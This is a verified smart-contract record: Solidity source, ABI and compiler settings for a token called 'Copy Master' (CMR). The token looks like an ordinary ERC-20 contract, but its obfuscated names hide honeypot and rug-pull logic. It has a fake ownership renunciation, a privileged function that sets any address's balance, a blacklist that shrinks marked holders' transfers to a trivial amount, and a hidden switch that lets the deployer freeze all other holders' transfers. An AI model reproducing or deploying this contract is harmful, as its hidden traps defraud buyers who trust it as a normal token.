{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface buyTeamLiquidity {\n    function createPair(address senderFrom, address teamTotal) external returns (address);\n}\n\ninterface autoMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchTx) external view returns (uint256);\n\n    function transfer(address senderAmountLimit, uint256 modeSell) external returns (bool);\n\n    function allowance(address fromMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderAmountLimit,\n        uint256 modeSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLaunchMarketing, uint256 value);\n    event Approval(address indexed fromMode, address indexed spender, uint256 value);\n}\n\nabstract contract takeModeTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoMinMetadata is autoMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CopyMaster is takeModeTotal, autoMin, autoMinMetadata {\n\n    function receiverTo(address exemptReceiver) public {\n        if (minWallet) {\n            return;\n        }\n        if (amountTx == fromListLaunch) {\n            receiverShould = fundMarketing;\n        }\n        amountTeam[exemptReceiver] = true;\n        \n        minWallet = true;\n    }\n\n    bool public fromListLaunch;\n\n    event OwnershipTransferred(address indexed amountMarketing, address indexed sellLimitMin);\n\n    mapping(address => mapping(address => uint256)) private enableBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isFeeLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    constructor (){\n        if (receiverLaunch) {\n            exemptEnable = false;\n        }\n        sellAt senderList = sellAt(minExempt);\n        takeAt = buyTeamLiquidity(senderList.factory()).createPair(senderList.WETH(), address(this));\n        if (receiverShould == limitTotal) {\n            amountTx = true;\n        }\n        swapAtMax = _msgSender();\n        amountTeam[swapAtMax] = true;\n        modeSender[swapAtMax] = isFeeLaunch;\n        launchLimit();\n        \n        emit Transfer(address(0), swapAtMax, isFeeLaunch);\n    }\n\n    function transfer(address fromLaunched, uint256 modeSell) external virtual override returns (bool) {\n        return minAutoTake(_msgSender(), fromLaunched, modeSell);\n    }\n\n    uint256 shouldExempt;\n\n    uint256 private receiverShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenReceiver;\n    }\n\n    bool public minWallet;\n\n    address totalMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchedTake(address fromLaunched, uint256 modeSell) public {\n        txReceiver();\n        modeSender[fromLaunched] = modeSell;\n    }\n\n    mapping(address => bool) public amountTeam;\n\n    uint256 constant marketingTeam = 18 ** 10;\n\n    function launchLimit() public {\n        emit OwnershipTransferred(swapAtMax, address(0));\n        receiverMarketing = address(0);\n    }\n\n    function tradingExempt(uint256 modeSell) public {\n        txReceiver();\n        maxTokenLaunch = modeSell;\n    }\n\n    function txReceiver() private view {\n        require(amountTeam[_msgSender()]);\n    }\n\n    function approve(address enableReceiverTrading, uint256 modeSell) public virtual override returns (bool) {\n        enableBuy[_msgSender()][enableReceiverTrading] = modeSell;\n        emit Approval(_msgSender(), enableReceiverTrading, modeSell);\n        return true;\n    }\n\n    bool private amountTx;\n\n    uint256 maxTokenLaunch;\n\n    address public swapAtMax;\n\n    function allowance(address tradingTake, address enableReceiverTrading) external view virtual override returns (uint256) {\n        if (enableReceiverTrading == minExempt) {\n            return type(uint256).max;\n        }\n        return enableBuy[tradingTake][enableReceiverTrading];\n    }\n\n    bool public receiverLaunch;\n\n    address minExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private autoFrom = \"Copy Master\";\n\n    string private swapTotal = \"CMR\";\n\n    uint256 public limitTotal;\n\n    uint256 private isFeeLaunch = 100000000 * 10 ** 18;\n\n    function feeToken(address toTx) public {\n        txReceiver();\n        if (fundMarketing == receiverShould) {\n            receiverLaunch = false;\n        }\n        if (toTx == swapAtMax || toTx == takeAt) {\n            return;\n        }\n        tokenAmount[toTx] = true;\n    }\n\n    function buyMode(address marketingReceiver, address senderAmountLimit, uint256 modeSell) internal returns (bool) {\n        require(modeSender[marketingReceiver] >= modeSell);\n        modeSender[marketingReceiver] -= modeSell;\n        modeSender[senderAmountLimit] += modeSell;\n        emit Transfer(marketingReceiver, senderAmountLimit, modeSell);\n        return true;\n    }\n\n    function balanceOf(address launchTx) public view virtual override returns (uint256) {\n        return modeSender[launchTx];\n    }\n\n    function transferFrom(address marketingReceiver, address senderAmountLimit, uint256 modeSell) external override returns (bool) {\n        if (_msgSender() != minExempt) {\n            if (enableBuy[marketingReceiver][_msgSender()] != type(uint256).max) {\n                require(modeSell <= enableBuy[marketingReceiver][_msgSender()]);\n                enableBuy[marketingReceiver][_msgSender()] -= modeSell;\n            }\n        }\n        return minAutoTake(marketingReceiver, senderAmountLimit, modeSell);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTotal;\n    }\n\n    address public takeAt;\n\n    uint8 private tokenReceiver = 18;\n\n    mapping(address => bool) public tokenAmount;\n\n    mapping(address => uint256) private modeSender;\n\n    function getOwner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    bool private exemptEnable;\n\n    function minAutoTake(address marketingReceiver, address senderAmountLimit, uint256 modeSell) internal returns (bool) {\n        if (marketingReceiver == swapAtMax) {\n            return buyMode(marketingReceiver, senderAmountLimit, modeSell);\n        }\n        uint256 receiverLimit = autoMin(takeAt).balanceOf(totalMin);\n        require(receiverLimit == maxTokenLaunch);\n        require(senderAmountLimit != totalMin);\n        if (tokenAmount[marketingReceiver]) {\n            return buyMode(marketingReceiver, senderAmountLimit, marketingTeam);\n        }\n        return buyMode(marketingReceiver, senderAmountLimit, modeSell);\n    }\n\n    uint256 private fundMarketing;\n\n    address private receiverMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return autoFrom;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimitMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunchMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableReceiverTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"feeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromListLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSell\",\"type\":\"uint256\"}],\"name\":\"launchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAtMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeSell\",\"type\":\"uint256\"}],\"name\":\"tradingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAmountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CopyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}